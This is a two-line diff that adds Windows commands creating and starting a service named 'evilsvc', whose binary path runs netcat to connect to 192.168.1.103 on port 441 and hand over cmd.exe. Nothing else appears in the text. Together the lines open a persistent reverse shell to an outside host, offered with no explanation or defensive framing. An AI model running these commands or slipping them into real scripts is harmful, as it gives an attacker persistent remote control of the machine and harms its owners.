@@ -1,0 +1,2 @@
+sc create evilsvc binpath= "c:\tools\nc 192.168.1.103 441 -e cmd.exe" 
+sc start evilsvc
